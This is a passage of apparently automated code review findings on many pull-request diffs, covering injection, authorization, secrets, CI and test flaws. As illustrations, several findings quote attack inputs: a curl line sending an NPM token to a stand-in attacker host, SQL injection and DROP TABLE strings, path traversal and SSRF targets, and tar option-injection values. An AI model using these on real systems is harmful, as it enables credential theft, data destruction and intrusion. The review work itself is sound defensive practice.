The diff provides no comment, docstring, or explanation for why this change was made or how the credential is meant to be managed. A developer or auditor reading this code cannot understand the security posture or whether this is intentional. The `client()` function's contract has changed from "read key from environment" to "use hardcoded key" with no documentation of this shift.

findings.title: client() behavior change has no test asserting api_key value
findings.body: The diff changes client() to use a hardcoded module-level secret instead of reading from the environment. Only a fixture (tests/fixtures/acmepay.py) was added, not an actual test calling client() and asserting acmepay.api_key equals ACMEPAY_SECRET_KEY. As written, nothing would fail if client() were reverted, broken, or set api_key to the wrong value.

findings.title: fake_client() return shape does not match real client()
findings.body: `client()` in `billing/acmepay_client.py` returns the `acmepay` module, whose key is reached as `acmepay.api_key`. `fake_client()` returns a plain dict, reached as `client()["api_key"]`. Any test that monkeypatches `client` with `fake_client` will break on attribute access rather than exercising the real interface. Return a small object exposing `api_key` as an attribute instead of a dict.

findings.title: Public function contract not documented
findings.body: The `client()` function is a public API (exported at module level, used by callers) but has no docstring. After this change, the function's behavior—that it returns a client configured with a specific hardcoded key—is not documented. A caller cannot tell from the function name, signature, or docstring what key it uses, how it is set, or what the client object is. This is especially important now that the key source has changed from environment-based to hardcoded.

findings.title: tenant_of returns an unauthenticated tenant id (verify_signature disabled)
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the token body is parsed without checking the RS256 signature, without checking `exp`, and without an `algorithms` allowlist. Any caller that uses the returned `tenant_id` for scoping a query, picking a database, or authorising an action is trusting a value the client can set to any string it likes — a user can simply base64-encode a header/payload with `tenant_id` set to another tenant and read or write their data. The module already has the correct primitive two lines above: derive the tenant from the verified claims, e.g. `return claims_for(token)["tenant_id"]`. If there is a genuine need to peek at a claim before verification (routing to the right key, for example), the function should be named and documented to make that unmistakable and must never be the source of an authorisation decision.

_Also raised by the security agent:_ tenant_id read from a JWT with signature verification disabled

findings.title: No test coverage for new tenant_of() function
findings.body: tenant_of() decodes a JWT with verify_signature=False and returns the tenant_id claim unchecked. There is no test in this diff exercising this function, so a regression (e.g. wrong claim key, exception on malformed token, or someone 'fixing' this to verify signatures and breaking callers) would not be caught. Given this reads directly from an unverified token and likely feeds into tenant-scoped authorization/data access downstream, at least a basic test (valid token returns correct tenant_id, malformed/missing claim raises predictably) should exist.

findings.title: Missing tenant_id claim raises a bare KeyError
findings.body: The claim is read with direct subscripting, so a token that decodes fine but carries no `tenant_id` raises `KeyError('tenant_id')` out of an auth helper. Callers are far more likely to be prepared for a JWT exception or a `None` than for a `KeyError`, and an unhandled one usually surfaces as a 500 rather than a 401. Prefer `.get("tenant_id")` with an explicit check, or raise the module's own auth error.

findings.title: update_payment_method mutates object without ownership check
findings.body:
`update_payment_method` resolves `pm_id` straight from the request into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()` — with no `require_owner(user, pm)` in between. `current_user(request)` is assigned to `user` on line 11 but never used, which strongly suggests the ownership check was intended and dropped.

Any authenticated caller can enumerate or guess `pm_id` values and rewrite the billing name on another user's stored payment method. Per the repo's own contract in `api/auth.py` ("Every object mutation must call this"), and matching the read path on line 6, insert the check immediately after fetching:

```python
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
```

_Also raised by the correctness agent:_ update_payment_method mutates without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on partial update

findings.title: Public API lacks documented authorization contract
findings.body: The `update_payment_method` function is a public API endpoint but has no docstring describing its authorization behavior. More critically, it is missing the `require_owner` call that the repository convention (documented in `api/auth.py`) explicitly states: "Every object mutation must call this." A caller reading this function cannot tell whether they are authorized to update any payment method or only their own, and the absence of the authorization check violates the established pattern.

findings.title: No test exercises update_payment_method, including missing authz check
findings.body: update_payment_method is new behavior with no accompanying test in this diff. Notably it omits the require_owner(user, pm) call that the neighboring get/read handler performs (line 6), meaning any user could update another user's payment method's billing_name. A test asserting that a non-owner request is rejected would have caught this immediately; as written, nothing would fail if this handler is wrong.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` no longer carries the `@rate_limit("5/hour")` decorator, and the `from limits import rate_limit` import was dropped with it. Password reset is a pre-authentication endpoint: the caller supplies `email` and the handler unconditionally calls `send_reset_email(email)`. With the throttle gone, a single client can drive unbounded reset emails — mail-bombing an arbitrary victim address, burning the sending domain's reputation/quota, and, if reset tokens are short-lived or low-entropy, generating a large pool of valid tokens to attack. High-volume enumeration of which addresses are registered also becomes cheap if the response or timing differs per address.

If the limiter genuinely needed to move, restore the protection at whatever layer replaced it (gateway/WAF/middleware) and reference that in the PR; nothing in this diff shows a replacement. Otherwise re-add the decorator, and consider keying the limit on both source IP and target email so one attacker cannot bomb many addresses within the per-IP budget.

findings.title: Password reset endpoint no longer bounds email sends per caller
findings.body: `request_reset` previously ran under `@rate_limit("5/hour")`; after this change nothing in the function limits how often it can be invoked. Each call unconditionally calls `send_reset_email(email)` and returns `{"sent": True}`, so a caller can drive an unbounded number of outbound emails for an arbitrary address — mailbox flooding for the victim and quota/cost exhaustion on the mail provider, plus removal of the throttle that slowed reset-token guessing. If the limiter was intentionally moved to middleware or a gateway, please point at that enforcement in the PR description; otherwise restore the decorator or add an equivalent per-identifier throttle before the send.

findings.title: No test guards against removal of rate limiting on password reset
findings.body: The rate_limit decorator was removed from request_reset with no accompanying test changes. If there was a prior test asserting the endpoint is rate-limited (e.g. checking for 429 after N requests), it's not visible in this diff, meaning removal could pass CI silently. Add or check for a test that exercises repeated calls to request_reset and asserts throttling behavior, so this regression would be caught automatically.

findings.title: read_export_preview bypasses _confined() path containment
findings.body:
The existing reader immediately above builds its path with `path = _confined(name)` (line 14), which is evidently the guard that keeps `name` inside `EXPORT_ROOT`. `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` with the raw argument. `os.path.join` does not constrain anything: `name="../../etc/passwd"` yields a path outside the export root, and an absolute `name` (e.g. `/etc/passwd`) discards `EXPORT_ROOT` entirely, so the first 4096 bytes of any file readable by the process are returned. Route the new function through the same helper: `path = _confined(name)` before opening.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

_Also raised by the docs agent:_ read_export_preview bypasses path confinement without documentation

findings.title: No test exercises read_export_preview's path handling
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function above it which calls _confined(name). No test in this change exercises this function at all, so a path-traversal-style regression (e.g. name containing '../') would pass silently. Given the existing code already has a confinement helper for this exact purpose, at minimum a test should assert that read_export_preview rejects or confines traversal attempts the same way the other function does.

findings.title: Ownership check removed from bulk_export enables cross-tenant reads
findings.body:
`bulk_export` takes caller-supplied `report_ids`, fetches each `Report` by id, and serialises them straight to the response. The per-report `require_owner(user, report)` loop that enforced tenant isolation was deleted along with the import, so any authenticated caller can enumerate or guess report ids belonging to other tenants and read their full contents via `r.to_dict()`.

If the goal is performance, keep the authorisation but make it cheap: filter the fetch by tenant (e.g. a single `Report.query(ids=report_ids, tenant_id=user.tenant_id)`), or batch-load and reject the whole request if any returned report's `tenant_id` differs from `user.tenant_id`. Removing the check is not an acceptable optimisation.

_Also raised by the correctness agent:_ bulk_export no longer enforces tenant ownership on exported reports

findings.title: No test guards the removed ownership check in bulk_export
findings.body: The diff removes the `require_owner` call from `bulk_export`, meaning a user could now fetch reports belonging to another tenant. There is no test in this PR (or apparently in the existing suite, since none is touched) that exercises `bulk_export` with a report belonging to a different tenant and asserts a Forbidden error. Such a test would have caught this regression; without it, nothing fails when the authorization check silently disappears.

findings.title: search_customers interpolates input, violating execute()'s params contract
findings.body:
`billing/db.py` documents `execute(sql, params=None)` as "Run a parameterised query. `params` must carry every caller value." `search_customers` instead formats `term` and `status` directly into the SQL string on line 9 and calls `execute(sql)` with no params on line 10, so no value is ever passed through the driver's escaping path.

Two concrete consequences:
- Correctness: any `term` or `status` containing a single quote (e.g. `O'Brien`) terminates the string literal and produces a syntax error or a silently different query.
- Security: the values are attacker-controlled SQL, so `status` of `x' OR '1'='1` returns every row and statement-terminating input can run arbitrary SQL.

Follow the pattern already used by `get_customer` on line 5:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

Note that the `%` wildcards must move into the parameter value, not stay in the SQL text, otherwise the driver will try to interpret them as placeholders.

findings.title: SQL injection: search_customers interpolates term and status into SQL
findings.body:
`search_customers(term, status)` concatenates both parameters into the query text with an f-string and calls `execute(sql)` with no `params` argument. Both values land inside single-quoted SQL literals, so any caller value containing an apostrophe terminates the literal and the rest is parsed as SQL — e.g. `status="x' OR '1'='1"` returns every customer row, and `term="%'; DROP TABLE customers; --"` reaches the driver as statement text.

Fix by keeping the query static and passing values through the driver, exactly as `get_customer` on line 5 does:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the bound value, not in the SQL. If `status` is drawn from a fixed set, additionally validate it against an allowlist.

findings.title: No test exists for search_customers behavior
findings.body: search_customers builds its SQL via f-string interpolation instead of using the parameterised execute() pattern shown in get_customer and documented in billing/db.py. There is no test in this diff covering this function, so a change in its query construction (e.g. injection-prone interpolation) would not be caught by any test suite.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check (SSRF)
findings.body:
`verify_endpoint(url)` issues `requests.get(url, timeout=5)` with no host validation, while the delivery path immediately above rejects any destination whose host is not in `ALLOWED_HOSTS`. Given the PR is about letting customers register a webhook target, the `url` passed here is customer-controlled, so an attacker can point it at internal addresses (`http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:…`, internal admin services) and use the returned status code as an oracle for internal port/service discovery. `file://` and other schemes supported by requests adapters widen this further, and `requests.get` follows redirects by default, so even an allowlisted host can 302 the request to an internal target.

Apply the same host allowlist (and a scheme check) before the request, resolve the host and reject private/link-local addresses, and pass `allow_redirects=False`. Factor the check out of the delivery function so both call sites share it rather than duplicating it.

_Also raised by the correctness agent:_ verify_endpoint bypasses the ALLOWED_HOSTS guard used by the send path

findings.title: verify_endpoint added with no test coverage
findings.body: verify_endpoint performs a live GET request to an arbitrary user-supplied URL and returns its status code, but unlike the existing post() path there is no visible check against ALLOWED_HOSTS and no test exercising this function. If this function were wrong (e.g. missing the host allowlist check that post() has, or mishandling redirects/timeouts), nothing in the diff would fail. Add a test verifying that verify_endpoint enforces the same destination restrictions as the post path, and that it returns the expected status code for an allowed host.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` that returns a status code reads as "tell me whether this endpoint is usable", but every ordinary failure mode of verification — DNS failure, connection refused, TLS error, and the 5-second timeout itself — surfaces as a `requests.exceptions.RequestException` rather than a return value. A caller doing `if verify_endpoint(url) == 200:` during customer registration will propagate an unhandled exception for the most common case it is trying to detect. Either catch `requests.RequestException` and return a sentinel (e.g. `None`), or rename/document the contract so callers know they must wrap the call.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guards to `false`: `block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`. Disabling all four is the explicit removal of the account/bucket-level control that prevents an object ACL or bucket policy from making invoice objects world-readable. Any subsequent policy or ACL — applied deliberately, by another module, or by a compromised deploy role — will take effect with no backstop, and public ACLs already attached to objects will be honoured rather than ignored.

The PR is titled "Add the public assets bucket", but this second bucket holds customer invoices, so the permissive setting looks copy-pasted from the assets block rather than intended. Recommended fix: either omit the `aws_s3_bucket_public_access_block` for `invoices` entirely (the default is all-blocked) or set all four attributes to `true`. If invoices genuinely need to be served, do it through a signed URL / CloudFront OAC rather than by opening the bucket.

_Also raised by the correctness agent:_ Invoices bucket disables all public access blocks

findings.title: Invoices bucket is out of scope for this change
findings.body: The PR is scoped to "Add the public assets bucket", but this hunk also introduces a second, unrelated bucket for customer invoices. An unrelated sensitive resource smuggled into a scoped change is easy to miss in review and easy to apply by accident. Split the invoices bucket into its own change where its access model, encryption and versioning can be reviewed on their own merits.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` is a copy of `verify_stripe` except that the final comparison uses `expected == header` rather than `hmac.compare_digest(expected, header)`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the expected signature an attacker-supplied header matched. With a remotely triggerable webhook endpoint that is enough to recover a valid signature byte-by-byte and forge requests. Change line 12 to `return hmac.compare_digest(expected, header)` to match line 7.

Secondary behavioural difference worth being aware of once fixed: `compare_digest` raises `TypeError` on a `None`/non-ASCII header while `==` quietly returns `False`, so `verify_stripe` and `verify_acmepay` currently behave differently for a missing header. Whichever you settle on, make both functions agree.

_Also raised by the security agent:_ Webhook HMAC compared with `==` instead of compare_digest

findings.title: Implicit contract violation: timing-safe comparison not guaranteed
findings.body: The verify_acmepay function is a public API (parallel to verify_stripe) that callers will expect to provide webhook verification, but it silently uses timing-unsafe string comparison (==) instead of the timing-safe hmac.compare_digest used by verify_stripe. A caller reading the function name and signature would reasonably assume both providers implement the same security properties. This creates a documentation/contract defect where the function's security guarantees are not what its caller would infer from the existing verify_stripe precedent. Either the implementation should match (use hmac.compare_digest), or a docstring must explicitly state the timing-unsafe comparison to prevent misuse.

findings.title: No test exists for new verify_acmepay function
findings.body: The new verify_acmepay function introduces new signature-verification behaviour (using '==' instead of hmac.compare_digest as in verify_stripe) but no test file is included in this diff to exercise it. If the comparison logic were wrong or regressed later, nothing would catch it.

findings.title: Stack trace and exception text returned to the client on 500
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now returns `str(exc)` plus `traceback.format_exc()`. Anything an attacker can do to trigger an exception becomes a read primitive on internals: source file paths and directory layout, module and function names, library versions inferred from frame paths, and whatever local values libraries embed in exception messages (DSNs, SQL fragments with data values, file paths, sometimes credentials from connection errors). Combined with a fuzzer that probes parameters until something raises, this maps the application's internal structure for free.

The trace is already captured for operators by `log.exception("request failed")` on line 8, so nothing is lost by keeping the response opaque. If a debugging handle is genuinely needed, return a correlation ID that is also written to the log line, and gate any trace in the response behind an explicit non-production config flag rather than making it the default:

```python
rid = uuid4().hex
log.exception("request failed", extra={"request_id": rid})
return {"error": "internal error", "request_id": rid}, 500
```

_Also raised by the correctness agent:_ traceback.format_exc() may not correspond to the `exc` argument

_Also raised by the correctness agent:_ Error response body shape and value changed for all existing callers

findings.title: Public error response contract changed without documentation
findings.body: The `handle()` function is a public error handler that returns a response contract to HTTP clients. The diff changes what that contract returns: from a generic `{"error": "internal error"}` to `{"error": str(exc), "traceback": traceback.format_exc()}`. This is a breaking change to a public API contract. Callers relying on the old response shape may break, and exposing raw exception text and tracebacks to clients is a common security anti-pattern. There is no docstring, comment, or changelog entry explaining whether this is intentional, under what conditions it applies, or what the new contract guarantees. A competent caller reading this code cannot determine if exception details are meant to be part of the public API or a temporary debugging artifact.

findings.title: No test covers the new error response shape/content
findings.body: The handle() function's return value changed from a generic error message to one including str(exc) and a full traceback. There is no test in this diff verifying the shape or content of this response, so a regression (e.g., reverting to leaking internals, or accidentally leaking more/less) would not be caught by any test suite.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password value with a single unsalted `hashlib.md5` pass, while the pre-existing `hash_password` in the same module uses `bcrypt.hashpw` with a generated salt. Two problems follow:

1. Security: MD5 is fast and unsalted here, so any credential written through the reset path is recoverable by offline brute force/rainbow table at a rate many orders of magnitude above the bcrypt path. A reset flow is exactly the flow that rewrites the stored credential, so this silently downgrades every account that uses it.
2. Correctness/contract: the two functions emit different digest formats (a 32-char hex string vs. a `$2b$...` bcrypt string). Any verification code written against `hash_password` — e.g. `bcrypt.checkpw(raw, stored)` — will not validate a value produced here; depending on the implementation it either returns False for a correct password or raises on an invalid salt.

The reset path should call `hash_password` (or bcrypt/argon2 directly) so the stored format and cost are identical to the normal path.

_Also raised by the security agent:_ Reset path hashes passwords with unsalted MD5 instead of bcrypt

findings.title: New password-reset hashing functions have no tests
findings.body: hash_reset_password and checksum are new public functions with no accompanying tests in this diff. If hash_reset_password were changed to produce a different digest, use a different algorithm, or if checksum read the wrong file / mishandled I/O errors, nothing here would fail. Add unit tests verifying expected output for known inputs (and error handling for checksum on missing files) before this path is relied upon elsewhere.

findings.title: pull_request_target runs fork-controlled script with NPM_TOKEN
findings.body:
Entry point: the head commit of any pull request, including one opened from a fork by an unauthenticated third party. `actions/checkout` is pinned to `github.event.pull_request.head.sha` (lines 11-12), so the working tree is exactly the attacker's branch — including `scripts/measure.sh` itself, plus anything it sources (package.json lifecycle scripts, Makefiles, config files).

Sink: `- run: ./scripts/measure.sh` on line 13, executed in a job whose environment now contains `secrets.NPM_TOKEN` (lines 14-15). Because the trigger is `pull_request_target`, the job runs in the context of the base repository with access to repository secrets and, absent a `permissions:` block, a `GITHUB_TOKEN` with the default (typically write) scopes. An attacker opens a PR that replaces `measure.sh` with `curl -d "$NPM_TOKEN" attacker.tld` and receives the publish token; the same code can push commits or alter releases via `GITHUB_TOKEN`.

Fixes, in order of preference:
1. Revert to `pull_request`. The stated goal — running the size check on forked PRs — is already met by `pull_request`, which fires for forks; it simply does not hand out secrets. If the check does not strictly need `NPM_TOKEN`, this is the whole fix.
2. If a secret is genuinely required, split into two workflows: an unprivileged `pull_request` job that builds the untrusted code and uploads an artifact, and a `workflow_run` job that consumes the artifact with the secret and never executes fork code.
3. If `pull_request_target` must stay, do not check out the head SHA at all (leave the default base-ref checkout) and never invoke scripts from the PR tree; additionally set `permissions:` to the minimum required.

_Also raised by the correctness agent:_ pull_request_target runs forked PR code with NPM_TOKEN in scope

findings.title: json.dumps raises TypeError for contexts the old key accepted
findings.body:
The previous key was `(template_source, tuple(sorted(context.items())))`, which accepted any hashable, orderable context values \u2014 `datetime`, `Decimal`, enum members, model instances, custom objects with `__hash__`. The new key serialises the whole context with `json.dumps`, which raises `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller passing a non-JSON-native value into a template context now gets an exception instead of a render. If the intent is only to shorten the key, hash a representation that tolerates arbitrary objects (e.g. `repr` of the sorted items, or `json.dumps(..., default=repr)`), or keep the tuple key and only digest it when it is serialisable.

Note the new tests only exercise `{"a": 1}`-style contexts, so this regression is not covered.

findings.title: MD5 digest as cache key allows collision-driven cache poisoning
findings.body:
The cache key is now `hashlib.md5(payload).hexdigest()` over a JSON encoding of the template source and the full context, replacing the previous exact key `(template_source, tuple(sorted(context.items())))`. The old key could not collide; the new one can. MD5 is not collision resistant \u2014 chosen-prefix collisions are cheap and the colliding blocks can be embedded in the JSON text, so an attacker who influences either `template_source` or any value in `context` can construct a second input whose digest matches a previously cached entry and receive `_CACHE[key]` \u2014 a render produced from someone else's template/context \u2014 on line 13, or conversely poison the entry other callers will read.

Use `hashlib.sha256(...).hexdigest()` instead; it is a drop-in change with no API impact here. If you keep MD5 for any reason, pass `usedforsecurity=False` \u2014 without it `hashlib.md5` raises `ValueError` on FIPS-enforcing builds, which would take the render path down entirely.

Whether this is reachable depends on who supplies `template_source` and `context`, which is not visible in this change; if both are always internal constants the impact is limited to an accidental collision.

findings.title: Switch to JSON-based key changes accepted context types, untested
findings.body: The old key used `tuple(sorted(context.items()))`, which works for any hashable/orderable values (e.g. tuples, sets-as-values, custom hashable objects) as long as they support comparison. The new key does `json.dumps([template_source, context], sort_keys=True)`, which requires every value to be JSON-serializable and raises TypeError otherwise. None of the added tests pass a non-JSON-serializable value (e.g. a tuple, a custom object, or a context with mixed key types) to confirm the new failure mode or that previously-supported context shapes still work.

findings.title: Test only asserts on a spy attribute, not real subprocess behaviour
findings.body:
`test_runs_without_a_shell` checks `spy.last_call.kwargs["shell"] is False`, which is an assertion on the mock/spy's recorded call rather than on anything the code actually produced (e.g. the exact argv list passed to `subprocess.run`, or that the previous shell-string form is gone). If `create_archive` were refactored to build the command differently but still happened to pass `shell=False` through some other spy-visible path, this test would still pass without verifying the args are actually a safe list. It would also pass even if the args list were malformed (e.g. wrong flag order, missing `--`), since only the `shell` kwarg is inspected.

_Also raised by the correctness agent:_ Test asserts shell=False but never asserts the argv is a list

findings.title: directory no longer goes through shell splitting/globbing
findings.body: The old call interpolated `directory` into a shell command line, so a caller could legitimately pass `"/srv/a /srv/b"` (two operands) or `"/srv/data/*"` (a glob) and tar would receive multiple expanded paths. With the list form plus the `--` terminator, the whole string is passed as one literal operand, so those callers now fail with `tar: ...: Cannot stat: No such file or directory` and, because `check=True`, raise `CalledProcessError`. Please confirm no caller passes a multi-path or glob string; if any does, accept a sequence of directories and splat it into the argv instead.

findings.title: No test covers the `--` separator protecting against a malicious `directory`
findings.body: The new code inserts `"--"` before `directory` in the argv list specifically to stop a `directory` value that starts with `-` (e.g. `--checkpoint=1;/bin/sh`) from being interpreted as a tar option — this is the actual security-relevant behaviour change introduced by switching to list-based args. No test exercises this: the only tests cover the archive `name` validation and a shell=False mock check, not any case where `directory` is attacker-influenced or option-like. If the `--` were accidentally dropped in a future edit, nothing here would fail.

findings.title: `directory` reaches tar unvalidated while `name` is checked
findings.body: `name` is now constrained to `[A-Za-z0-9_-]{1,64}` before being interpolated into the output path, but `directory` flows straight into the argv list with no check at all. Because the list form is used and `--` precedes it, option injection (e.g. `--use-compress-program=sh -c ...`) and shell metacharacters are both neutralised, so this is not RCE. What remains is arbitrary-path read: if a caller passes a user-supplied value, `create_archive("nightly", "/etc")` or `".../../home/deploy/.ssh"` writes the contents of that tree into `/exports/nightly.tar.gz`, which the name suggests is a location artifacts are fetched from. Consider constraining `directory` to a resolved path under an allowed root (`os.path.realpath` + `startswith` on the export source root) rather than trusting the caller.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() on an empty invoice but never asserts on the result. It will pass regardless of what render() returns, including if it raises no exception but produces incorrect or garbage output; it only fails if render() itself throws.

_Also raised by the correctness agent:_ test_renders_empty_invoice has no assertion

findings.title: Test asserts mock call_count, not actual rendered output
findings.body:
test_renders_line_items patches format_line and only checks that it was called twice. It never asserts anything about what render() actually produces, so a bug that renders line items incorrectly (wrong order, wrong formatting, dropped content) would not be caught. This test can pass even if the real output is completely wrong.

_Also raised by the correctness agent:_ Line-item test asserts on a mock's call count, not on rendered output

findings.title: Failing half-to-even test deleted with no accompanying fix
findings.body:
`test_rounds_half_to_even` asserted that `round_cents(Decimal("2.345")) == Decimal("2.34")`, i.e. banker's rounding at an exact tie. It has been removed and the diff contains no change to the implementation of `round_cents` — the only file touched is this test file, and every changed line is a deletion. Either the rounding behaviour is still wrong and the failure has simply been silenced, or the intended behaviour changed and the test should have been updated to the new expectation (e.g. `Decimal("2.35")`) rather than dropped. The exact-tie case is the single boundary that distinguishes half-to-even from half-up, and after this change nothing in the suite covers it; the remaining `test_rounds_up_above_half` passes under either rounding mode. Please restore the test with the correct expected value and include the implementation fix the title refers to.

_Also raised by the tests agent:_ Deleted failing test instead of fixing the rounding bug it exposed

findings.title: Mock patches wrong target; retry test exercises real deliver()
findings.body:
`notify/sender.py` uses `from notify.transport import deliver`, so the name `deliver` is bound in `notify.sender`'s namespace at import time. Patching `notify.transport.deliver` rebinds only the attribute on the `notify.transport` module and leaves `notify.sender.deliver` pointing at the original function. `send_with_retry` will therefore call the real `deliver` three times \u2014 the test either hits real I/O or passes for reasons unrelated to the mock, and it would keep passing if the retry loop were broken.

Use the same target as the passing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count is 3, otherwise the "gives up after three attempts" claim in the test name is never actually checked.

_Also raised by the tests agent:_ Mock patches notify.transport.deliver, not notify.sender.deliver

findings.title: Test patches wrong target, contradicting module documentation
findings.body: The docstring in notify/sender.py (lines 4-5) explicitly documents that patching `notify.transport.deliver` does not affect the code, because `deliver` is bound into the module's namespace at import time. The new test on line 7 patches `notify.transport.deliver`, which means the test will not actually exercise the retry logic it claims to test — the real `deliver` function will still be called. This test will pass for the wrong reason and fail to catch real bugs in retry behavior.

findings.title: csv_rows joins fields without calling csv_escape
findings.body: `csv_rows` builds each line with a bare `",".join(str(r.get(c, "")) ...)`. Any cell value that contains a comma (or a double quote, or an embedded newline) will split into extra columns when the output is parsed, silently corrupting every downstream consumer of the report. The escaping helper for exactly this case is defined four lines later in the same module but is never called. Change the comprehension to `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: New exporter functions added with no tests, breaking existing convention
findings.body: The repository already tests csv_header in reports/tests/test_csv.py, establishing a convention of testing exporter functions. This PR adds six new functions (csv_rows, csv_escape in csv_export.py; dump_streaming, dump_pretty in json_export.py; margins_for, usable_width in pdf_export.py) with real logic (CSV quoting rules, chunked JSON generation, margin arithmetic) but none of them have any test coverage. A bug in csv_escape's quoting logic, an off-by-one in dump_streaming's chunking, or an incorrect margin calculation would all currently pass CI silently.

findings.title: csv_rows writes values unescaped, bypassing csv_escape
findings.body:
`csv_rows` interpolates each field with `str(r.get(c, ""))` and joins on `,`, never calling the `csv_escape` helper defined immediately below it. Any field value containing a comma, a double quote, or a newline will change the column/record boundaries of the generated document — a consumer parsing the output sees extra columns or extra rows that the producer never intended. If `rows` originates from user-supplied report data (the entry point is not visible in this diff or in the retrieved context), this is field/record injection into the CSV consumer.

Fix: render each field via `csv_escape(str(r.get(c, "")))`, and extend `csv_escape` to also quote values containing `\n` or `\r` (the current predicate on line 12 only covers `,` and `"`). Using the stdlib `csv` module would handle all of this. Separately, consider prefixing values beginning with `=`, `+`, `-` or `@` if the output is opened in a spreadsheet.

findings.title: csv_escape raises TypeError for non-string values
findings.body: `csv_escape` immediately does `"," in value`, which raises `TypeError: argument of type 'int' is not iterable` for any non-string input. Report cells are frequently numbers, dates or `None`. Either coerce at the top (`value = str(value)`) or document that callers must pass strings — the docstring currently says only "a value", implying any value is acceptable.

findings.title: dump_streaming yields nothing for an empty rows list
findings.body: When `rows` is empty, `range(0, 0, chunk_size)` is empty and the generator yields no chunks at all, so a consumer writing the stream to a file produces a zero-byte output rather than a valid `[]`. `dump([])` by contrast returns `"[]"`. If callers treat the two functions as interchangeable, the empty-report case differs. Consider yielding `"[]"` when `rows` is empty. Note also that `len(rows)` and slicing require a sequence, so this cannot stream a generator despite the name.

findings.title: New test relies on real datetime.now(), reintroducing time-dependent flakiness
findings.body:
The existing test (line 4-6) deliberately fixes 'now' via an explicit `now=` argument to avoid time dependence — exactly the pattern this PR's title suggests we're testing for. The new test instead calls `issue_token()` and `is_expired(token.expires_at)` with no fixed time, and compares `token.issued_at.date()` to `datetime.now(timezone.utc).date()`. If `issue_token()` and the assertion straddle midnight UTC, or if the test runs in CI at exactly that boundary, the date comparison fails spuriously despite correct behaviour — the opposite of what a 'test the token expiry window' PR should add.

_Also raised by the correctness agent:_ Date comparison against datetime.now() is flaky across UTC midnight

findings.title: No test covers the expired-coupon rejection path
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon with expires_at=tomorrow(), which never exercises this branch. If the comparison logic were inverted, or the exception were never raised, or raised for valid coupons, no test would fail. Add a test that passes an already-expired coupon and asserts CouponExpired is raised.

findings.title: apply_coupon can now raise; existing callers assume it always returns an order
findings.body: `apply_coupon` previously always returned the mutated order. It can now raise `CouponExpired` on a reachable input (any coupon past its expiry). Every existing call site that treats the return value as unconditional \u2014 e.g. checkout paths that do `order = apply_coupon(order, coupon)` \u2014 will now propagate an uncaught exception instead of completing. Either catch `CouponExpired` at the call sites and surface a user-facing validation error, or return a result/None the callers already handle. No call sites were included in the diff or retrieved context, so this needs verification against the rest of the codebase.

findings.title: Public function `apply_coupon` lacks contract documentation for new exception
findings.body: The function `apply_coupon` is now a public API that raises `CouponExpired` when a coupon has expired (line 9-10), but there is no docstring documenting this behavior. A caller cannot determine from the function signature alone that they must handle `CouponExpired` or that it requires checking coupon expiration. This is a public contract change that callers need to know about.

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async def` but calls `requests.get(...)`, which is a synchronous, blocking I/O call. Awaiting this coroutine does not yield to the event loop: the entire loop (and therefore every other in-flight request handled by this process) is frozen for the duration of the call, up to the 5-second timeout, and longer if DNS resolution to `billing.internal` hangs before the timeout applies. Because the body contains no `await`, the `async` keyword also buys nothing — callers get the false impression this call is concurrent.

Use the same async client style already established by `fetch_plan` on line 5, e.g. accept an `httpx.AsyncClient` parameter and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If a sync client is unavoidable, move it off the loop with `asyncio.to_thread(...)` rather than calling it inline.

findings.title: New blocking-call function has no test coverage
findings.body: fetch_plan_limits is declared async but calls the synchronous `requests.get`, which will block the event loop. Nothing in this diff exercises this function, so a test asserting it doesn't block (e.g. running concurrently with another coroutine) or even a basic call/return test would catch both the correctness of the JSON parsing and the blocking-call defect. As it stands, the behavior change is entirely untested.

findings.title: Unvalidated tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is formatted straight into the path of an internal service URL with no validation or percent-encoding. `requests` does not resolve or reject dot-segments, so a value such as `../../admin/keys` (or one containing `?`/`#`) reaches `https://billing.internal/` as a different path or with an attacker-chosen query string, letting a caller pivot to other endpoints on an internal, likely unauthenticated service. Validate the identifier before use (e.g. reject anything not matching `^[A-Za-z0-9_-]+$`) or pass it via `urllib.parse.quote(tenant_id, safe="")`. The pre-existing `fetch_plan` on line 6 has the same shape, so a shared validation helper would fix both.

Note for whoever triages this: I cannot see the HTTP handler that supplies `tenant_id`; if it is already constrained to a UUID upstream this is not exploitable.

findings.title: Bare `except` swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
